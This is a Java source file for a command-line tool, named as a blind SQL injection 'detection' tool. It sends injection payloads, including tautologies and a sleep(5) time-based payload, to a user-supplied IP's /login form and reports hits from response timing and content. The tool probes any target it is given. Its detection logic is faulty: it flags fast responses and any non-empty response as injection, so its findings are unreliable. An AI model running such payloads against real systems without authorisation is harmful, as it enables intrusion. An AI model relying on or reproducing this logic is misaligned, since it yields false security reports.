import java.io.*;
import java.net.*;
import java.util.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

public class BlindSQLInjectionDetector {
    
    // Function to detect Blind SQL Injection patterns by analyzing response time (time-based blind SQLi)
    public static void detectBlindSQLInjection(String ipAddress) {
        System.out.println("Checking for potential Blind SQL Injection on " + ipAddress + "...");

        // SQL injection payloads (commonly used for Blind SQL Injection testing)
        String[] payloads = {
            "' AND 1=1 --",  // Basic Blind SQLi payload
            "' AND 1=2 --",  // False condition to detect timing difference
            "' OR 1=1 --",   // Common Blind SQLi payload
            "' OR 1=2 --",   // False condition for time delay detection
            "' AND sleep(5) --",  // Time-based Blind SQLi (sleep for 5 seconds)
        };

        // Target URL for testing, assuming there's a login or query endpoint
        String url = "http://" + ipAddress + "/login";  // Adjust this based on the target app

        for (String payload : payloads) {
            try {
                // Send POST request with payload in the 'username' field
                Map<String, String> data = new HashMap<>();
                data.put("username", payload);
                data.put("password", "password");

                // Measure the time for each request with the payload
                long startTime = System.currentTimeMillis();
                String response = sendPostRequest(url, data);
                long endTime = System.currentTimeMillis();

                // Calculate response time (in milliseconds)
                long responseTime = endTime - startTime;

                // Detect timing-based Blind SQL Injection by checking for delay
                if (payload.contains("sleep(5)") && responseTime >= 5000) {
                    System.out.println("[!] Blind SQL Injection detected (Time-based) with payload: " + payload);
                    System.out.println("Response time: " + responseTime + " milliseconds");
                } else if (payload.equals("' AND 1=2 --") && responseTime < 1000) { // Check for difference in response time
                    System.out.println("[!] Blind SQL Injection detected (Boolean-based) with payload: " + payload);
                    System.out.println("Response time: " + responseTime + " milliseconds");
                } else if (payload.equals("' AND 1=1 --") && response != null && !response.isEmpty()) {
                    System.out.println("[!] Potential Blind SQL Injection detected with payload: " + payload);
                    System.out.println("Response: " + response);
                }

            } catch (Exception e) {
                System.out.println("[!] Error making request: " + e.getMessage());
            }
        }
    }

    // Function to send a POST request to the target URL
    private static String sendPostRequest(String url, Map<String, String> data) throws IOException {
        URL targetUrl = new URL(url);
        HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

        // Prepare form data
        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String, String> entry : data.entrySet()) {
            if (postData.length() > 0) postData.append("&");
            postData.append(URLEncoder.encode(entry.getKey(), StandardCharsets.UTF_8));
            postData.append("=");
            postData.append(URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8));
        }

        // Send the POST data
        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = postData.toString().getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        // Read the response
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            return response.toString();
        }
    }

    // Main function
    public static void main(String[] args) {
        System.out.println("================= Blind SQL Injection Attack Detection Tool =================");

        // Prompt the user for an IP address to test for Blind SQL Injection
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the target IP address:");
        String ipAddress = scanner.nextLine();

        // Start detecting Blind SQL Injection attempts
        detectBlindSQLInjection(ipAddress);
    }
}
